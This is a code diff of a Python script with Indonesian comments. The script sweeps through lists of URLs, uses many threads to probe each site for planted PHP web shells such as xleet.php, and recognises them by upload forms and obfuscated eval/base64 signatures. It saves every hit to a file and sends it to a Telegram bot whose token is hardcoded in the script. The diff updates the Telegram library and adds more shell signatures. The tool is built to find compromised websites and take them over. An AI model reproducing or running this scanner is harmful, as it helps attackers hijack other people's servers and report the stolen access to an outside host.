@@ -1,18 +1,17 @@
 import subprocess
 import sys
-import telepot
 
 # List pustaka yang diperlukan
-required_libraries = ['requests', 'telepot']
+required_libraries = ['requests', 'python-telegram-bot']
 
 # Fungsi untuk memeriksa dan menginstal pustaka yang diperlukan
 def install_missing_libraries():
-    installed_libraries = subprocess.Popen([sys.executable, '-m', 'pip', 'list'], stdout=subprocess.PIPE).communicate()[0]
+    installed_libraries = subprocess.check_output([sys.executable, '-m', 'pip', 'list']).decode('utf-8')
     for library in required_libraries:
         if library not in installed_libraries:
-            print('Missing library: {}. Installing...'.format(library))
-            subprocess.call([sys.executable, '-m', 'pip', 'install', library])
-            print('{} installed successfully.'.format(library))
+            print(f'Missing library: {library}. Installing...')
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', library])
+            print(f'{library} installed successfully.')
 
 # Memanggil fungsi untuk memeriksa dan menginstal pustaka yang diperlukan
 install_missing_libraries()
@@ -20,7 +19,9 @@ install_missing_libraries()
 # Setelah pustaka-pustaka terinstal, Anda dapat melanjutkan dengan import dan menjalankan skrip Anda seperti biasa
 import requests as rq
 from multiprocessing.dummy import Pool as pl
+from telegram import Bot
 import sys
+
 # Token bot Telegram
 TELEGRAM_BOT_TOKEN = '6764902068:AAEntjE5CO8v2iTn220ZdJvG07ERwlNAnRc'
 # ID grup atau pengguna yang akan menerima pesan
@@ -19692,11 +19693,10 @@ files = ['xleet.php',
 'admin.php',
 'about.php',
 'install.php']
-
 def v(url, p='http'):
     for dir in dirs:
         for file in files:
-            yield '{}://{}{}/{}'.format(p, url, dir, file)
+            yield f'{p}://{url}{dir}/{file}'
 
 def c(u):
     try:
@@ -19705,23 +19705,23 @@ def c(u):
             for s in v(u, pr):
                 try:
                     r = rq.get(s, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0'}, timeout=10)
-                    if 'type="submit" value="upload"' in r.text or 'type="submit" value="submit"' in r.text or 'type="file" name="gecko-upload"' in r.text:
-                        print('Found      {}'.format(s))
+                    if 'type="submit" value="upload"' in r.text or 'type="submit" value="submit"' in r.text or 'name=pf method=post' in r.text or 'name=files method=post' in r.text or 'eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))))' in r.text or 'class="header_values" id="header_uname"' in r.text or 'type="file" name="gecko-upload"' in r.text:
+                        print(f'Found      {s}')
                         with open('Shells.txt', 'a') as f:
-                            f.write('{}\n'.format(s))
+                            f.write(f'{s}\n')
                         send_telegram_message(s)  # Kirim pesan ke Telegram
                         return
                 except Exception as e:
-                    print('Error occurred while processing {}: {}'.format(s, e))
+                    print(f'Error occurred while processing {s}: {e}')
                     continue
-        print('Not Found {}'.format(u))
+        print(f'Not Found {u}')
     except Exception as e:
-        print('Error occurred while processing {}: {}'.format(u, e))
+        print(f'Error occurred while processing {u}: {e}')
 
 def send_telegram_message(message):
-    bot = telepot.Bot(TELEGRAM_BOT_TOKEN)
-    formatted_message = "```\n===========--Result Shell--===========\n{}\n===========--Result Shell--===========\n```".format(message)
-    bot.sendMessage(TELEGRAM_CHAT_ID, formatted_message, parse_mode='Markdown')
+    bot = Bot(token=TELEGRAM_BOT_TOKEN)
+    formatted_message = f"===========--Result Shell--===========\n{message}\n===========--Result Shell--==========="
+    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=formatted_message)
 
 def bn():
     print("""
@@ -19733,7 +19733,7 @@ def bn():
 
            
  """)
-
+    
 def m():
     try:
         if len(sys.argv) < 2:
@@ -19741,7 +19741,7 @@ def m():
             return
         
         f = sys.argv[1]
-        with open(f, 'r') as fl:
+        with open(f, 'r', errors='ignore') as fl:
             urls = fl.read().splitlines()
 
         if not urls:
@@ -19751,7 +19751,7 @@ def m():
         pool = pl(100)
         pool.map(c, urls)
 
-    except IOError:
+    except FileNotFoundError:
         print("File not found.")
 
 if __name__ == "__main__":
